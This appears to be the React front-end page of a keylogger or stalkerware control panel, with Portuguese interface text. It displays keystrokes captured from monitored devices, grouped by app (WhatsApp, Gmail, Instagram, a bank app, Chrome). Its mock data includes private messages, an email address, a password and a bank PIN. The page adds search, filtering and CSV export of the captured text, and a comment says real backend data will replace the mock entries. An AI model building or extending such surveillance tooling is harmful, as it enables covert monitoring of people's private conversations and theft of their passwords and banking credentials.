import { useState, useMemo } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card } from "@/components/ui/card";
import { Download, Search, Filter, X } from "lucide-react";

interface Keylog {
  id: number;
  deviceId: number;
  appName: string;
  keyText: string;
  createdAt: Date;
}

// Mock data - será substituído por dados reais do backend
const MOCK_KEYLOGS: Keylog[] = [
  {
    id: 1,
    deviceId: 1,
    appName: "WhatsApp",
    keyText: "Oi, tudo bem?",
    createdAt: new Date(Date.now() - 1000 * 60 * 5),
  },
  {
    id: 2,
    deviceId: 1,
    appName: "Gmail",
    keyText: "usuario@email.com",
    createdAt: new Date(Date.now() - 1000 * 60 * 10),
  },
  {
    id: 3,
    deviceId: 1,
    appName: "WhatsApp",
    keyText: "Sim, e você?",
    createdAt: new Date(Date.now() - 1000 * 60 * 15),
  },
  {
    id: 4,
    deviceId: 1,
    appName: "Instagram",
    keyText: "Que foto legal!",
    createdAt: new Date(Date.now() - 1000 * 60 * 20),
  },
  {
    id: 5,
    deviceId: 1,
    appName: "Gmail",
    keyText: "senha123",
    createdAt: new Date(Date.now() - 1000 * 60 * 25),
  },
  {
    id: 6,
    deviceId: 2,
    appName: "WhatsApp",
    keyText: "Reunião amanhã?",
    createdAt: new Date(Date.now() - 1000 * 60 * 30),
  },
  {
    id: 7,
    deviceId: 2,
    appName: "Banco",
    keyText: "1234",
    createdAt: new Date(Date.now() - 1000 * 60 * 35),
  },
  {
    id: 8,
    deviceId: 2,
    appName: "Chrome",
    keyText: "www.google.com",
    createdAt: new Date(Date.now() - 1000 * 60 * 40),
  },
];

export default function Keylogs() {
  const [searchText, setSearchText] = useState("");
  const [selectedApp, setSelectedApp] = useState<string | null>(null);
  const [startDate, setStartDate] = useState("");
  const [endDate, setEndDate] = useState("");
  const [currentPage, setCurrentPage] = useState(1);
  const itemsPerPage = 20;

  // Extrair apps únicos
  const uniqueApps = useMemo(
    () => Array.from(new Set(MOCK_KEYLOGS.map((log) => log.appName))),
    []
  );

  // Filtrar keylogs
  const filteredKeylogs = useMemo(() => {
    return MOCK_KEYLOGS.filter((log) => {
      // Filtro por texto
      if (
        searchText &&
        !log.keyText.toLowerCase().includes(searchText.toLowerCase())
      ) {
        return false;
      }

      // Filtro por app
      if (selectedApp && log.appName !== selectedApp) {
        return false;
      }

      // Filtro por data
      if (startDate) {
        const logDate = new Date(log.createdAt).toISOString().split("T")[0];
        if (logDate < startDate) return false;
      }

      if (endDate) {
        const logDate = new Date(log.createdAt).toISOString().split("T")[0];
        if (logDate > endDate) return false;
      }

      return true;
    });
  }, [searchText, selectedApp, startDate, endDate]);

  // Paginação
  const totalPages = Math.ceil(filteredKeylogs.length / itemsPerPage);
  const paginatedKeylogs = filteredKeylogs.slice(
    (currentPage - 1) * itemsPerPage,
    currentPage * itemsPerPage
  );

  // Exportar para CSV
  const handleExportCSV = () => {
    const csv = [
      ["Data", "App", "Texto"],
      ...filteredKeylogs.map((log) => [
        new Date(log.createdAt).toLocaleString("pt-BR"),
        log.appName,
        log.keyText,
      ]),
    ]
      .map((row) => row.map((cell) => `"${cell}"`).join(","))
      .join("\n");

    const blob = new Blob([csv], { type: "text/csv" });
    const url = window.URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `keylogs-${new Date().toISOString().split("T")[0]}.csv`;
    a.click();
  };

  // Limpar filtros
  const handleClearFilters = () => {
    setSearchText("");
    setSelectedApp(null);
    setStartDate("");
    setEndDate("");
    setCurrentPage(1);
  };

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-3xl font-bold text-white">⌨️ Keylogs</h1>
          <p className="text-slate-400 mt-2">
            Total: {filteredKeylogs.length} registros
          </p>
        </div>
        <Button
          onClick={handleExportCSV}
          disabled={filteredKeylogs.length === 0}
          className="bg-cyan-600 hover:bg-cyan-700 text-white"
        >
          <Download className="w-4 h-4 mr-2" />
          Exportar CSV
        </Button>
      </div>

      {/* Filtros */}
      <Card className="bg-slate-800 border-slate-700 p-6">
        <div className="flex items-center justify-between mb-4">
          <h2 className="text-cyan-400 font-bold flex items-center gap-2">
            <Filter className="w-5 h-5" />
            Filtros
          </h2>
          {(searchText ||
            selectedApp ||
            startDate ||
            endDate) && (
            <Button
              onClick={handleClearFilters}
              variant="outline"
              size="sm"
              className="text-slate-400 hover:text-white"
            >
              <X className="w-4 h-4 mr-1" />
              Limpar
            </Button>
          )}
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
          {/* Busca por texto */}
          <div>
            <label className="text-sm text-slate-400 mb-2 block">
              Buscar Texto
            </label>
            <div className="relative">
              <Search className="absolute left-3 top-3 w-4 h-4 text-slate-500" />
              <Input
                type="text"
                placeholder="Digite o texto..."
                value={searchText}
                onChange={(e) => {
                  setSearchText(e.target.value);
                  setCurrentPage(1);
                }}
                className="bg-slate-700 border-slate-600 text-white pl-10 placeholder:text-slate-500"
              />
            </div>
          </div>

          {/* Filtro por app */}
          <div>
            <label className="text-sm text-slate-400 mb-2 block">App</label>
            <select
              value={selectedApp || ""}
              onChange={(e) => {
                setSelectedApp(e.target.value || null);
                setCurrentPage(1);
              }}
              className="w-full bg-slate-700 border border-slate-600 text-white rounded px-3 py-2 placeholder:text-slate-500"
            >
              <option value="">Todos os apps</option>
              {uniqueApps.map((app) => (
                <option key={app} value={app}>
                  {app}
                </option>
              ))}
            </select>
          </div>

          {/* Data inicial */}
          <div>
            <label className="text-sm text-slate-400 mb-2 block">
              Data Inicial
            </label>
            <Input
              type="date"
              value={startDate}
              onChange={(e) => {
                setStartDate(e.target.value);
                setCurrentPage(1);
              }}
              className="bg-slate-700 border-slate-600 text-white placeholder:text-slate-500"
            />
          </div>

          {/* Data final */}
          <div>
            <label className="text-sm text-slate-400 mb-2 block">
              Data Final
            </label>
            <Input
              type="date"
              value={endDate}
              onChange={(e) => {
                setEndDate(e.target.value);
                setCurrentPage(1);
              }}
              className="bg-slate-700 border-slate-600 text-white placeholder:text-slate-500"
            />
          </div>
        </div>
      </Card>

      {/* Lista de Keylogs */}
      <Card className="bg-slate-800 border-slate-700 p-6">
        {paginatedKeylogs.length === 0 ? (
          <p className="text-slate-400 text-center py-8">
            Nenhum keylog encontrado com os filtros aplicados
          </p>
        ) : (
          <>
            <div className="space-y-2">
              {paginatedKeylogs.map((log) => (
                <div
                  key={log.id}
                  className="flex items-start gap-4 p-4 bg-slate-700 rounded border border-slate-600 hover:border-cyan-500 transition"
                >
                  <div className="flex-1">
                    <div className="flex items-center gap-2 mb-2">
                      <span className="px-2 py-1 bg-cyan-600 text-white text-xs rounded font-bold">
                        {log.appName}
                      </span>
                      <span className="text-slate-500 text-xs">
                        {new Date(log.createdAt).toLocaleString("pt-BR")}
                      </span>
                    </div>
                    <p className="text-slate-300 break-words">{log.keyText}</p>
                  </div>
                </div>
              ))}
            </div>

            {/* Paginação */}
            {totalPages > 1 && (
              <div className="flex items-center justify-center gap-2 mt-6">
                <Button
                  onClick={() => setCurrentPage(Math.max(1, currentPage - 1))}
                  disabled={currentPage === 1}
                  variant="outline"
                  size="sm"
                >
                  ← Anterior
                </Button>

                <div className="flex items-center gap-1">
                  {Array.from({ length: totalPages }).map((_, i) => (
                    <Button
                      key={i + 1}
                      onClick={() => setCurrentPage(i + 1)}
                      variant={currentPage === i + 1 ? "default" : "outline"}
                      size="sm"
                      className={
                        currentPage === i + 1
                          ? "bg-cyan-600 hover:bg-cyan-700"
                          : ""
                      }
                    >
                      {i + 1}
                    </Button>
                  ))}
                </div>

                <Button
                  onClick={() =>
                    setCurrentPage(Math.min(totalPages, currentPage + 1))
                  }
                  disabled={currentPage === totalPages}
                  variant="outline"
                  size="sm"
                >
                  Próxima →
                </Button>
              </div>
            )}
          </>
        )}
      </Card>
    </div>
  );
}
